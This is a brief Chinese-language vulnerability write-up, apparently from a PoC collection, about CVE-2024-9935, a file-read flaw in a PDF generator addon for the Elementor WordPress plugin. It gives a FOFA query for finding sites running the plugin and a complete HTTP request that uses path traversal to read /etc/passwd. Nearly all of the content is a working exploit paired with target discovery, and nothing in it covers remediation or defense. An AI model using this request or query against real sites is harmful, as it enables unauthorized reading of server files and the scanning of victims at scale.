# WordPress插件ElementorPageBuilder存在文件读取漏洞(CVE-2024-9935)
<font style="color:rgb(51, 51, 51);">WordPress是一款免费开源的内容管理系统(CMS)，最初是一个博客平台，但后来发展成为一个功能强大的网站建设工具，适用于各种类型的网站，包括个人博客、企业网站、电子商务网站等，并逐步演化成一款内容管理系统软件。Wordpress ElementorPageBuilder插件存在文件读取漏洞(CVE-2024-9935)</font>

## fofa
```javascript
body="wp-content/plugins/pdf-generator-addon-for-elementor-page-builder/"
```

## poc
```plain
GET /elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1733332897353-929b7478-0833-4bbc-bc98-db28b9d1bca9.png)

